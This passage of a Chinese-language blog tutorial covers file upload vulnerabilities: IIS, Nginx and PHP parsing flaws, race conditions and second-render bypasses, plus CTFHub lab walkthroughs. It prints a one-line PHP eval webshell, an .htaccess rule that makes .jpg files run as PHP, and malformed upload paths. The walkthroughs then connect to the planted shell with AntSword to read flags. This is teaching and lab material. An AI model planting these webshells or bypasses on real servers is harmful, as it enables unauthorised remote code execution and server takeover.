<p> apache 1.x  apache 2.2.x</p>
</blockquote>
<h4 id="3-IIS6-0-解析漏洞："><a href="#3-IIS6-0-解析漏洞：" class="headerlink" title="3.IIS6.0&#96;解析漏洞："></a>3.IIS6.0&#96;解析漏洞：</h4><blockquote>
<p><code>IIS6.0</code>解析漏洞分<code>两种</code>：  1、目录解析： 以<code>xx.asp</code>命名的<code>文件夹</code>里的文件都将会被当成<code>ASP文件</code>执行。  2、文件解析： <code>xx.asp;.jpg</code> 像这种畸形文件名在<code>;</code>后面的直接被忽略，也就是说当成<code>xx.asp</code>文件执行。</p>
</blockquote>
<p> <code>IIS6.0</code> 默认的可执行文件除了<code>asp</code>还包含这三种 <code>.asa</code> <code>.cer</code> <code>.cdx</code>。</p>
<h3 id="三-IIS7-0-IIS7-5-Nginx的解析漏洞："><a href="#三-IIS7-0-IIS7-5-Nginx的解析漏洞：" class="headerlink" title="三.IIS7.0 | IIS7.5 | Nginx的解析漏洞："></a>三.IIS7.0 | IIS7.5 | Nginx的解析漏洞：</h3><h4 id="1-原理：-3"><a href="#1-原理：-3" class="headerlink" title="1.原理："></a>1.原理：</h4><blockquote>
<p> <code>Nginx</code>拿到文件路径（更专业的说法是<code>URI</code>）<code>/test.jpg/test.php</code>后，一看后缀是<code>.php</code>，便认为该文件是<code>php文件</code>，转交给<code>php</code>去处理。<code>php</code>一看<code>/test.jpg/test.php</code>不存在，便删去最后的<code>/test.php</code>，又看<code>/test.jpg</code>存在，便把<code>/test.jpg</code>当成要执行的文件了，又因为后缀为<code>.jpg</code>，<code>php</code>认为这不是<code>php文件</code>，于是返回<code>Access denied</code>。   这其中涉及到<code>php</code>的一个选项：<code>cgi.fix_pathinfo</code>，该值默认为<code>1</code>，表示开启。开启这一选项<code>PHP</code>可以对文件路径进行<code>修理</code>。 </p>
</blockquote>
<p>举个例子，当php遇到文件路径&#x2F;1.jpg&#x2F;2.txt&#x2F;3.php时</p>
<ul>
<li>若&#x2F;1.jpg&#x2F;2.txt&#x2F;3.php不存在，则会去掉最后的&#x2F;3.php，</li>
<li>然后判断&#x2F;1.jpg&#x2F;2.txt是否存在，</li>
<li>若存在，则把&#x2F;1.jpg&#x2F;2.txt当做文件&#x2F;1.jpg&#x2F;2.txt&#x2F;3.php</li>
<li>若&#x2F;1.jpg&#x2F;2.txt仍不存在，则继续去掉&#x2F;2.txt，以此类推。</li>
</ul>
<h4 id="2-漏洞形式："><a href="#2-漏洞形式：" class="headerlink" title="2.漏洞形式："></a>2.漏洞形式：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.xxxxx.com/UploadFiles/image/1.jpg/1.php</span><br></pre></td></tr></table></figure>

<h3 id="四-另外两种解析漏洞："><a href="#四-另外两种解析漏洞：" class="headerlink" title="四.另外两种解析漏洞："></a>四.另外两种解析漏洞：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.xxxxx.com/UploadFiles/image/1.jpg%00.php` `www.xxxxx.com/UploadFiles/image/1.jpg/%20\0.php</span><br></pre></td></tr></table></figure>

<h2 id="条件竞争漏洞"><a href="#条件竞争漏洞" class="headerlink" title="条件竞争漏洞"></a>条件竞争漏洞</h2><blockquote>
<p>   条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。</p>
</blockquote>
<p>上传文件源代码里没有校验上传的文件，文件直接上传，上传成功后才进行判断：如果文件格式符合要求，则重命名，如果文件格式不符合要求，将文件删除。 </p>
<p>由于服务器并发处理(同时)多个请求，假如<code>a用户</code>上传了木马文件，由于代码执行需要时间，在此过程中<code>b用户</code>访问了<code>a用户</code>上传的文件，会有以下三种情况： </p>
<ul>
<li>访问时间点在上传成功之前，没有此文件。 </li>
<li>访问时间点在刚上传成功但还没有进行判断，该文件存在。 </li>
<li>访问时间点在判断之后，文件被删除，没有此文件。</li>
</ul>
<h2 id="二次渲染漏洞"><a href="#二次渲染漏洞" class="headerlink" title="二次渲染漏洞"></a>二次渲染漏洞</h2><h4 id="1-二次渲染原理："><a href="#1-二次渲染原理：" class="headerlink" title="1.二次渲染原理："></a>1.二次渲染原理：</h4><blockquote>
<p>         在我们上传文件后，网站会对图片进行二次处理（格式、尺寸要求等），服务器会把里面的内容进行替换更新，处理完成后，根据我们原有的图片生成一个新的图片并放到网站对应的标签进行显示。</p>
</blockquote>
<h4 id="2-绕过："><a href="#2-绕过：" class="headerlink" title="2.绕过："></a>2.绕过：</h4><p>​	配合文件包含漏洞：  将一句话木马插入到网站二次处理后的图片中，也就是把一句话插入图片在二次渲染后会保留的那部分数据里，确保不会在二次处理时删除掉。这样二次渲染后的图片中就存在了一句话，在配合文件包含漏洞获取webshell。 </p>
<p>​	可以配合条件竞争：  这里二次渲染的逻辑存在漏洞，先将文件上传，之后再判断，符合就保存，不符合删除，可利用条件竞争来进行爆破上传</p>
<h4 id="3-判断"><a href="#3-判断" class="headerlink" title="3.判断"></a>3.判断</h4><p><strong>如何判断图片是否进行了二次处理？</strong></p>
<blockquote>
<p>   对比要上传图片与上传后的图片大小，使用<code>16进制编辑器</code>打开图片查看上传后保留了哪些数据，查看那些数据被改变。</p>
</blockquote>
<h1 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h1><h2 id="CTFHub"><a href="#CTFHub" class="headerlink" title="CTFHub"></a>CTFHub</h2><p>CTFHub上面的题不多也不难，很适合基础入门</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240308230822227.png" alt="image-20240308230822227"></p>
<h3 id="无验证"><a href="#无验证" class="headerlink" title="无验证"></a>无验证</h3><ul>
<li>首先这是作为一道入门题，没有任何的过滤和验证</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240308231135690.png" alt="image-20240308231135690"></p>
<ul>
<li>那我们就来练习一下蚁剑的使用以及一句话木马的制作吧</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@eval($_POST[&#x27;password&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>注意，这个木马很可能会被电脑本身的防火墙给拦截</p>
</li>
<li><p>下面我们将一个木马文件上传</p>
</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240308231442039.png" alt="image-20240308231442039"></p>
<ul>
<li>因为没有任何验证，所以可以直接提交</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240308231514349.png" alt="image-20240308231514349"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240308231537486.png" alt="image-20240308231537486"></p>
<ul>
<li>将文件的<strong>相对</strong>路径复制到url后面（记得加个**&#x2F;**）</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240308231710017.png" alt="image-20240308231710017"></p>
<ul>
<li>然后用蚁剑打开</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240308232124558.png" alt="image-20240308232124558"></p>
<ul>
<li>进入服务器可以看到我们刚才添加的php文件</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240308232224025.png" alt="image-20240308232224025"></p>
<ul>
<li>说明文件上传成功了</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240308232443210.png" alt="image-20240308232443210"></p>
<ul>
<li>返回上一级，就可以找到flag啦</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240308232510305.png" alt="image-20240308232510305"></p>
<h3 id="前端验证"><a href="#前端验证" class="headerlink" title="前端验证"></a>前端验证</h3><ul>
<li>首先我们打开一个php文件并尝试上传，发现不能上传：</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240308233156622.png" alt="image-20240308233156622"></p>
<ul>
<li>查看源代码可以知道，这是因为存在白名单验证，只有jpg、png、gif的文件才能通过验证</li>
<li>我们可以通过抓包，上传一个jpg格式的文件（这个本质其实是是php木马文件修改后缀名而成），并在bp中改回它的后缀名 即php，也就是将其还原</li>
<li>注意这里的顺序：</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240308233434772.png" alt="image-20240308233434772"></p>
<ul>
<li>只要将文件名的后缀修改即可</li>
<li>发送请求后发现文件成功上传了</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240308233518137.png" alt="image-20240308233518137"></p>
<ul>
<li>将刚刚上传的文件的相对路径复制到url后面</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240308233609615.png" alt="image-20240308233609615"></p>
<ul>
<li>打开蚁剑 复制url</li>
<li>测试连接，连接通过说明上传成功且能通过蚁剑来访问</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240308233642534.png" alt="image-20240308233642534"></p>
<ul>
<li>可以看到，这里是我们刚刚上传的文件</li>
<li>其中包括一个用来抓包的jpg文件的修改后还原的php文件</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240308233702483.png" alt="image-20240308233702483"></p>
<ul>
<li>同样的，在目录中寻找flag的位置</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240308233716887.png" alt="image-20240308233716887"></p>
<ul>
<li>这样子就可以获取flag了·</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240308233730453.png" alt="image-20240308233730453"></p>
<h3 id="MINI验证"><a href="#MINI验证" class="headerlink" title="MINI验证"></a>MINI验证</h3><ul>
<li>进入靶场</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240308234921579.png" alt="image-20240308234921579"></p>
<ul>
<li>用一个php文件上传看看，显然验证不通过</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240308234930327.png" alt="image-20240308234930327"></p>
<ul>
<li>于是采用抓包的方式，先上传一个jpg文件：</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240308235123352.png" alt="image-20240308235123352"></p>
<ul>
<li>通过burp suite进行抓包：</li>
<li>可以看到 这里的MINI类型已经是jpg类型的了（因为我们上传的文件 虽然内容是eval 但是格式或者说后缀名是jpg类型的）</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240308235147505.png" alt="image-20240308235147505"></p>
<ul>
<li>既然Content-Type（也就是MINI类型）符合，那么只要改回文件的后缀名，就可以将其还原成php木马了</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240308235220170.png" alt="image-20240308235220170"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240308235238281.png" alt="image-20240308235238281"></p>
<ul>
<li>点击发送 可以看到文件已经上传成功 并回显了文件的相对路径</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240308235256044.png" alt="image-20240308235256044"></p>
<ul>
<li>将相对路径复制到原来网页url的后面</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240308235357979.png" alt="image-20240308235357979"></p>
<ul>
<li>打开蚁剑尝试连接</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240308235429091.png" alt="image-20240308235429091"></p>
<ul>
<li>这样就进入它的服务端了，并且可以看到我们刚刚上传的文件</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240308235453775.png" alt="image-20240308235453775"></p>
<ul>
<li>同理 找到html下的flag</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240308235504379.png" alt="image-20240308235504379"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240308235542511.png" alt="image-20240308235542511"></p>
<h3 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h3><ul>
<li>这道题是通过上传<strong>htaccess</strong>文件达到绕过的目的</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240309142214285.png" alt="image-20240309142214285"></p>
<ul>
<li>我们先扔一个php文件试试</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240309142240546.png" alt="image-20240309142240546"></p>
<ul>
<li>嗯 显然上传不了 因为文件类型被限制 验证不通过</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240309142244012.png" alt="image-20240309142244012"></p>
<ul>
<li>那么我们上传一个正经的jpg文件看看</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240309142304677.png" alt="image-20240309142304677"></p>
<ul>
<li>欸 发现可以上传</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240309142307246.png" alt="image-20240309142307246"></p>
<ul>
<li>于是我们就利用htaccess文件的特性，上传一个jpg类型的木马</li>
<li><strong>htaccess</strong>会在服务器将这个<strong>jpg</strong>以<strong>php</strong>的形式解析，从而达到绕过的效果</li>
<li>当然了 首先我们得先上传一个htaccess过去 放到它的下载路径里面</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240309142348285.png" alt="image-20240309142348285"></p>
<ul>
<li>嗯 成功上传htaccess文件</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240309142349695.png" alt="image-20240309142349695"></p>
<ul>
<li>这边给一下<strong>htaccess</strong>文件的内容</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure>

<ul>
<li>这段代码的意思就是将jpg类型的文件以php的形式解析</li>
<li>下面就可以上传我们的木马了（虽然是jpg类型）</li>
<li>对了 如果没有htaccess文件 这里我们也是可以把这个jpg类型的小木马上传的，但是这样子上传过去的木马是不能正常使用的 充其量也只是一个没有啥内容的图片</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240309142601713.png" alt="image-20240309142601713"></p>
<ul>
<li>好的 上传成功</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240309142544001.png" alt="image-20240309142544001"></p>
<ul>
<li>将文件的相对路径copy过去</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240309142550160.png" alt="image-20240309142550160"></p>
<ul>
<li>复制域名，用蚁剑打开</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240309142607040.png" alt="image-20240309142607040"></p>
<ul>
<li>发现连接成功！说明木马能正常使用</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240309142612288.png" alt="image-20240309142612288"></p>
<p>打开文件列表我们可以看到</p>
<ul>
<li>我们上传的<strong>仍然</strong>是一个jpg类型文件！！！</li>
<li>只是htaccess会将它以php的形式解码 相当于发挥了原有的木马性能</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240309142812444.png" alt="image-20240309142812444"></p>
<ul>
<li>可以试一下 如果把这个htaccess文件删除</li>
<li>那么这个jpg类型的木马就使用不了了</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240309142817562.png" alt="image-20240309142817562"></p>
<ul>
<li>可见 会报错 因为识别不到能用的木马程序</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240309142840369.png" alt="image-20240309142840369"></p>
<ul>
<li>好了 拿下flag</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240309142844389.png" alt="image-20240309142844389"></p>
<h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><ul>
<li>首先上传一个<strong>jpg</strong>类型的木马 并用<strong>burp suite</strong>抓包</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240309160023189.png" alt="image-20240309160023189"></p>
<ul>
<li>我们先来尝试一下修改文件<strong>后缀类型</strong> 改为php类型</li>
<li>发现上传过去的文件失去了php后缀</li>
<li>说明该题对php进行了<strong>滤过</strong></li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240309160028313.png" alt="image-20240309160028313"></p>
<ul>
<li>尝试用<strong>双写后缀</strong>进行绕过</li>
<li>注意 双写不是随便双写就可以的噢</li>
<li>发现上传的文件成功还原成了php类型</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240309160033755.png" alt="image-20240309160033755"></p>
<ul>
<li>复制相对地址</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240309160036146.png" alt="image-20240309160036146"></p>
<ul>
<li>连接蚁剑</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240309160038422.png" alt="image-20240309160038422"></p>
<ul>
<li>可以看到这里有三个文件</li>
<li>第二个是用于抓包时上传过去的jpg类型的木马</li>
